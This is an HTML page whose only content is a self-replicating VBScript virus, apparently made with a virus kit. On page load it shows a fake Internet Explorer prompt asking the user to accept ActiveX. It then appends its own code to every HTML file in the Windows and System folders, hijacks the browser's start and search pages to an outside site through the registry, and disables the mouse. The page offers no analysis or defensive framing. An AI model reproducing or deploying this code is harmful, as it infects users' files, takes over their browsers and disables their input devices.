<2>
<coded with the PHTMLVG tool by 1>
<html><head><title>1</title></head><body>
<script language=VBScript>
On Error Resume Next
MsgBox "Please accept the ActiveX by clicking YES",vbinformation,"Internet Explorer"
Set vcxbeq=CreateObject("Scripting.FileSystemObject")
Set qswyaw=CreateObject("WScript.Shell")
If err.number=429 Then
qswyaw.Run javascript:location.reload()
Else

wohyyp(vcxbeq.GetSpecialFolder(0))
wohyyp(vcxbeq.GetSpecialFolder(1))

qswyaw.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.petikvx.fr.fm"
qswyaw.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.petikvx.fr.fm"
qswyaw.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Local Page","http://www.petikvx.fr.fm"
qswyaw.Run "rundll32.exe mouse,disable"

End If

Function wohyyp(dir)
If vcxbeq.FolderExists(dir) Then
Set sbyccu=vcxbeq.GetFolder(dir)
Set gegr=sbyccu.Files
For each kndp in gegr
wyo=lcase(vcxbeq.GetExtensionName(kndp.Name))

If wyo="htm" or wyo="html" Then
Set ogphdk=vcxbeq.OpenTextFile(kndp.path, 1, False)
If ogphdk.ReadLine <> "<2>" Then
ogphdk.Close()
Set ogphdk=vcxbeq.OpenTextFile(kndp.path, 1, False)
htmorg=ogphdk.ReadAll()
ogphdk.Close()
Set cxewex=document.body.CreateTextRange
Set ogphdk=vcxbeq.CreateTextFile(kndp.path, True, False)
ogphdk.WriteLine "<2>"
ogphdk.Write(htmorg)
ogphdk.WriteLine cxewex.htmltext
ogphdk.Close()
Else
ogphdk.Close()
End If

End If
Next
End If
End Function
</script></body></html>
